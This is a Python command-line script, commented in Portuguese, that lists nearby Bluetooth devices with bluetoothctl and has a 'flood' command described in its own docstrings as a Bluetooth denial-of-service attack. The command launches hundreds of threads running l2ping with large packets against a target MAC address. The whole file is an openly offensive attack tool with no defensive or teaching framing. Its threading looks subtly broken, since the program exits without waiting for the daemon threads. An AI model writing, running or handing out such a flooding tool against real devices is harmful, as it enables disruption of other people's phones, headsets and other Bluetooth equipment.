import asyncio
import time
import re
import threading
import subprocess
import argparse

def list_bluetooth(wait_time):
    """Escaneia dispositivos Bluetooth próximos e retorna uma lista de endereços MAC e nomes."""
    try:
        with subprocess.Popen(
            ['bluetoothctl'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        ) as process:
            
            # Espera um pouco para evitar problemas com o pipe
            time.sleep(1)

            # Inicia a varredura de dispositivos Bluetooth
            process.stdin.write("scan on\n")
            process.stdin.flush()

            print(f'Waiting {wait_time}s for advertisements...')
            time.sleep(wait_time)

            # Para a varredura e lista os dispositivos detectados
            process.stdin.write("scan off\n")
            process.stdin.flush()
            process.stdin.write("devices\n")
            process.stdin.flush()

            # Captura a saída do comando
            output = process.stdout.read()

        # Processa a saída para encontrar dispositivos
        devices = []
        for line in output.splitlines():
            match = re.search(r"Device ([0-9A-F:]+)\s+(.+)", line)
            if match:
                address, name = match.groups()
                devices.append(f'{address} {name}')

        return devices

    except Exception as e:
        print(f"Erro ao escanear dispositivos Bluetooth: {e}")
        return []


async def main():
    """Função principal que processa os argumentos da linha de comando e executa o comando apropriado."""
    args = parse_args()

    if args.command == 'list':
        # Lista dispositivos Bluetooth
        devices = list_bluetooth(args.wait_time)
        if devices:
            for dev in devices:
                print(f'{dev}')
        else:
            print("Nenhum dispositivo encontrado.")

    elif args.command == 'flood':
        # Inicia um ataque DoS Bluetooth com múltiplas threads
        for i in range(args.threads):
            print(f'[*] Thread {i} iniciada')
            threading.Thread(target=flood, args=(args.target, args.packet_size), daemon=True).start()


def flood(target_addr, packet_size):
    """Executa um ataque de flooding via Bluetooth usando l2ping."""
    print(f"Iniciando ataque DoS em {target_addr} com tamanho de pacote {packet_size}")
    try:
        subprocess.run(['l2ping', '-i', 'hci0', '-s', str(packet_size), target_addr], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Erro ao executar l2ping: {e}")
    except FileNotFoundError:
        print("Erro: l2ping não encontrado. Instale o pacote 'bluez'.")


def parse_args():
    """Analisa os argumentos da linha de comando e retorna os parâmetros fornecidos."""
    parser = argparse.ArgumentParser(description="Script para escaneamento Bluetooth e ataques DoS.")

    subparsers = parser.add_subparsers(dest='command')

    # Comando para listar dispositivos
    parser_list = subparsers.add_parser('list', help='Lista dispositivos Bluetooth próximos')
    parser_list.add_argument('--wait-time', type=int, default=5, help='Tempo de espera para escaneamento (default: 5s)')

    # Comando para ataque de flooding
    parser_flood = subparsers.add_parser('flood', help='Executa um ataque de flooding no dispositivo alvo')
    parser_flood.add_argument('target', type=str, help='Endereço MAC do dispositivo alvo')
    parser_flood.add_argument('--packet-size', type=int, default=600, help='Tamanho dos pacotes (default: 600 bytes)')
    parser_flood.add_argument('--threads', type=int, default=300, help='Número de threads (default: 300)')

    args = parser.parse_args()

    # Se nenhum comando for fornecido, exibe ajuda e encerra
    if args.command is None:
        parser.print_help()
        exit(1)

    return args


if __name__ == '__main__':
    asyncio.run(main())